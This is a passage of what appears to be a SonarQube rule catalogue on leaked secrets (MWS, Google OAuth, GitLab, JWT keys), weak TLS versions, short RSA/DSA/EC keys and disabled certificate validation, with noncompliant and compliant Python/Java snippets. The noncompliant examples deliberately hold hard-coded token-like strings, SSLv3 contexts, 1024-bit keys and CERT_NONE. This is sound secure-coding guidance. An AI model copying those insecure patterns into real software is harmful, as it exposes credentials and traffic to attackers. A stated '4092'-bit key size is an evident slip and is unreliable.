<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("mws-key", "amzn.mws.3b8be74a-5f63-5770-5bad-19bd40c0ac65") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("mws-key", System.getenv("MWS_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6691">
              secrets:S6691
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A Google client OAuth secret is a confidential string that is used to authenticate and authorize applications when they interact with Google APIs.
It is a part of the OAuth 2.0 protocol, which allows applications to access user data on their behalf.</p>
<p>The client secret is used in the OAuth flow to verify the identity of the application and ensure that only authorized applications can access user
data. It is typically used in combination with a client ID, which identifies the application itself.</p>
<p>If a Google client OAuth secret leaks to an unintended audience, it can have serious security implications. Attackers who obtain the client secret
can use it to impersonate the application and gain unauthorized access to user data. They can potentially access sensitive information, modify data,
or perform actions on behalf of the user without their consent.</p>
<p>The exact capabilities of the attackers will depend on the authorizations the corresponding application has been granted.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>Google Cloud console provides a Logs Explorer feature that can be used to audit recent access to a cloud infrastructure.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("client_secret", "TgxYWFmND-1NTYwNTgzMDM3N") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("client_secret", System.getenv("CLIENT_SECRET"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> Google Documentation - <a href="https://cloud.google.com/docs/security/compromised-credentials">Handling compromised Google Cloud
  credentials</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6690">
              secrets:S6690
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>GitLab tokens are used for authentication and authorization purposes. They are essentially access credentials that allow users or applications to
interact with the GitLab API.</p>
<p>With a GitLab token, you can perform various operations such as creating, reading, updating, and deleting resources like repositories, issues,
merge requests, and more. Tokens can also be scoped to limit the permissions and actions that can be performed.</p>
<p>A leaked GitLab token can have significant consequences for the security and integrity of the associated account and resources. It exposes the
account to unauthorized access, potentially leading to data breaches and malicious actions. The unintended audience can exploit the leaked token to
gain unauthorized entry into the GitLab account, allowing them to view, modify, or delete repositories, issues, and other resources. This unauthorized
access can result in the exposure of sensitive data, such as proprietary code, customer information, or confidential documents, leading to potential
data breaches.</p>
<p>Moreover, the unintended audience can perform malicious actions within the account, introducing vulnerabilities, injecting malicious code, or
tampering with settings. This can compromise the security of the account and the integrity of the software development process.</p>
<p>Additionally, a leaked token can enable the unintended audience to take control of the GitLab account, potentially changing passwords, modifying
settings, and adding or removing collaborators. This account takeover can disrupt development and collaboration workflows, causing reputational damage
and operational disruptions.</p>
<p>Furthermore, the impact of a leaked token extends beyond the immediate account compromise. It can have regulatory and compliance implications,
requiring organizations to report the breach, notify affected parties, and potentially face legal and financial consequences.</p>
<p>In general, the compromise of a GitLab token would lead to consequences referred to as supply chain attacks that can affect more than one’s own
organization.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("token", "glpat-zcs1FfaxGnHfvzd7ExHz") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("token", System.getenv("TOKEN"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4423">
              python:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="21" data-diff-type="noncompliant">
import ssl

ssl.SSLContext(ssl.PROTOCOL_SSLv3) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="21" data-diff-type="compliant">
import ssl

context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.minimum_version = ssl.TLSVersion.TLSv1_2
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4426">
              python:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul>
  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>
  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul>
      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li>
    </ul>  </li>
</ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in pyca</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

backend = default_backend()

private_key = rsa.generate_private_key(key_size = 1024, backend = backend) # Noncompliant
public_key  = private_key.public_key()
</pre>
<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
from cryptography.hazmat.primitives.asymmetric import dsa
from cryptography.hazmat.backends import default_backend

backend = default_backend()

private_key = dsa.generate_private_key(key_size = 1024, backend = backend) # Noncompliant
public_key  = private_key.public_key()
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

backend = default_backend()

private_key = ec.generate_private_key(curve=ec.SECT163R2(), backend=backend)  # Noncompliant
public_key  = private_key.public_key()
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

backend = default_backend()

private_key = rsa.generate_private_key(key_size = 3072, backend = backend)
public_key  = private_key.public_key()
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
from cryptography.hazmat.primitives.asymmetric import dsa
from cryptography.hazmat.backends import default_backend

backend = default_backend()

private_key = dsa.generate_private_key(key_size = 3072, backend = backend)
public_key  = private_key.public_key()
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

backend = default_backend()

private_key = ec.generate_private_key(curve=ec.SECP521R1(), backend=backend)
public_key  = private_key.public_key()
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of
<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>
<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve
parameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves
currently include:</p>
<ul>
  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>
  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>
  <li> Curve448. </li>
  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>
</ul>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
"post-quantum") counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation">Learn more here</a>.</p>
<h2>Resources</h2>
<ul>
  <li> Documentation
    <ul>
      <li> NIST Documentation - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf">NIST SP 800-186: Recommendations
      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>
      <li> IETF - <a href="https://datatracker.ietf.org/doc/html/rfc5639">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and
      Curve Generation</a> </li>
    </ul>  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6781">
              python:S6781
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>If a JWT secret key leaks to an unintended audience, it can have serious security implications for the corresponding application. The secret key is
used to encode and decode JWTs when using a symmetric signing algorithm, and an attacker could potentially use it to perform malicious actions.</p>
<p>For example, an attacker could use the secret key to create their own authentication tokens that appear to be legitimate, allowing them to bypass
authentication and gain access to sensitive data or functionality.</p>
<p>In the worst-case scenario, an attacker could be able to execute arbitrary code on the application by abusing administrative features, and take
over its hosting server.</p>
<h2>How to fix it in Flask</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p>Changing the secret value is sufficient to invalidate any data that it protected.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>The following noncompliant code contains a hard-coded secret that can be exposed unintentionally.</p>
<pre data-diff-id="101" data-diff-type="noncompliant">
from flask import Flask

app = Flask(__name__)
app.config['JWT_SECRET_KEY'] = secret_key  # Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>A solution is to set this secret in an environment string.</p>
<pre data-diff-id="101" data-diff-type="compliant">
from flask import Flask
import os

app = Flask(__name__)
app.config['JWT_SECRET_KEY'] = os.environ["JWT_SECRET_KEY"]
</pre>
<h3>Going the extra mile</h3>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> Flask JWT documentation - <a href="https://flask-jwt-extended.readthedocs.io/en/stable/options.html#jwt-secret-key">Config - JWT_SECRET_KEY</a>
  </li>
  <li> Python-Jose documentation - <a href="https://python-jose.readthedocs.io/en/latest/jwt/index.html">JSON Web Token</a> </li>
  <li> PyJWT documentation - <a href="https://pyjwt.readthedocs.io/en/stable/api.html">API Reference</a> </li>
  <li> Simple JWT documentation - <a href="https://django-rest-framework-simplejwt.readthedocs.io/en/latest/settings.html#signing-key">SIGNING_KEY</a>
  </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4830">
              python:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>Certificate validation is not enabled by default when <code>_create_unverified_context</code> is used. It is recommended to use
<code>_create_default_https_context</code> instead to create a secure context that validates certificates.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="21" data-diff-type="noncompliant">
import ssl

ctx1 = ssl._create_unverified_context() # Noncompliant
ctx2 = ssl._create_stdlib_context() # Noncompliant

ctx3 = ssl.create_default_context()
ctx3.verify_mode = ssl.CERT_NONE # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="21" data-diff-type="compliant">
import ssl

ctx = ssl.create_default_context()
ctx.verify_mode = ssl.CERT_REQUIRED

# By default, certificate validation is enabled
ctx = ssl._create_default_https_context()
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
